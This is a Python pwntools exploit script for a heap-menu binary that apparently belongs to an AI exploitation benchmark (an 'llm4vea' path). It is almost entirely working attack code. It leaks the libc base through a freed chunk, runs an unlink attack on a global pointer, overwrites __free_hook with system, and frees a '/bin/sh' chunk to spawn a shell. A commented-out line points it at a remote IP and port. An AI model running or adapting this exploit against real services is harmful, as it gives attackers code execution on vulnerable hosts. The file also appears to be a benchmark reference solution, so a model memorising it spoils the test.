# EXP
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/root/llm4vea/inputs/benchmarks/heap/vuln1/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
# p=remote('125.220.147.45',49174)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/root/llm4vea/inputs/benchmarks/heap/vuln1/pwn")
libc=ELF("/root/llm4vea/inputs/benchmarks/heap/vuln1/libc.so.6")

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *0x401839')
    pause()

menu="5.exit"

def add(idx,size,cont):
    p.sendlineafter(menu,str(1))
    p.sendlineafter("Idx:",str(idx))
    p.sendlineafter("Size",str(size))
    p.sendafter("input the note: ",cont)

def delete(idx):
    p.sendlineafter(menu,str(2))
    p.sendlineafter("Idx:",str(idx))

def show(idx):
    p.sendlineafter(menu,str(3))
    p.sendlineafter("Idx:",str(idx))

def edit(idx,cont):
    p.sendlineafter(menu,str(4))
    p.sendlineafter("Idx:",str(idx))
    p.sendafter("input the note: ",cont)


target=0x404140

add(0,0x428,b'aaaa')
add(1,0x4f0,b'aaaa')

delete(0)
show(0)
dbg()
libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-0x1ecbe0
print(hex(libcbase))

payload = p64(0) + p64(0x421) + p64(target - 0x18) + p64(target - 0x10)
payload = payload.ljust(0x420,b'\x00')
payload += p64(0x420)
edit(0,payload)

delete(1)

edit(1,b'/bin/sh\x00')
atoi_got=0x404060
free_hook=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']
payload=b'\x00'*0x18+p64(free_hook)
edit(0,payload)
edit(0,p64(system))

delete(1)
# p.sendlineafter(menu,b'/bin/sh\x00')
# p.sendlineafter("Idx:",b'/bin/sh\x00')

p.interactive()
```